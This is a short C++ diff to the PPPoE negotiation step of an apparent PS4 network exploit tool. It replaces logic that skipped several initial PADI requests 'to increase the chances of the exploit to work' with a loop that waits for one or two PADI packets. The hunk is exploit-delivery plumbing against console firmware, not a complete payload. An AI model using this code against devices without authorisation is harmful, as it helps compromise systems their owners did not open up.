@@ -440,31 +440,21 @@ public:
     }
 
     void ppp_negotation(const std::function<std::vector<uint8_t>(Exploit *)> &cb = nullptr,
-                        bool ignore_initial_reqs = false) {
-        /**
-         * Ignore initial requests in order to increase the chances of the exploit to work
-         * Tested from 6 to 8 requests, on version 10.50 - all give best results then not ignoring
-         */
-        static bool ignore{};
-        static int num_reqs_to_ignore{}, num_ignored_reqs{};
-        ignore = ignore_initial_reqs;
-        num_reqs_to_ignore = 6;
-        num_ignored_reqs = 0;
+                        bool ignore_initial_req = false) {
+        int padi_count = ignore_initial_req ? 2 : 1;
 
-        std::cout << "[*] Waiting for PADI..." << std::endl;
         Cookie pkt;
-        dev->startCaptureBlockingMode([](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
-            if (ignore && (num_ignored_reqs < num_reqs_to_ignore)) {
-                std::cout << "[*] Ignoring initial PS4 PPoE request #" << num_ignored_reqs + 1 << std::endl;
-                num_ignored_reqs += 1;
-                return false;
-            }
-            pcpp::Packet parsedPacket(packet, pcpp::PPPoEDiscovery);
-            auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADI);
-            if (!layer) return false;
-            ((Cookie *) cookie)->packet = parsedPacket;
-            return true;
-        }, &pkt, 0);
+        while (padi_count--) {
+            std::cout << "[*] Waiting for PADI..." << std::endl;
+            dev->startCaptureBlockingMode(
+                    [](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) -> bool {
+                        pcpp::Packet parsedPacket(packet, pcpp::PPPoEDiscovery);
+                        auto *layer = getPPPoEDiscoveryLayer(parsedPacket, pcpp::PPPoELayer::PPPOE_CODE_PADI);
+                        if (!layer) return false;
+                        ((Cookie *) cookie)->packet = parsedPacket;
+                        return true;
+                    }, &pkt, 0);
+        }
 
         auto *pppoeDiscoveryLayer = pkt.packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
         if (!pppoeDiscoveryLayer) {
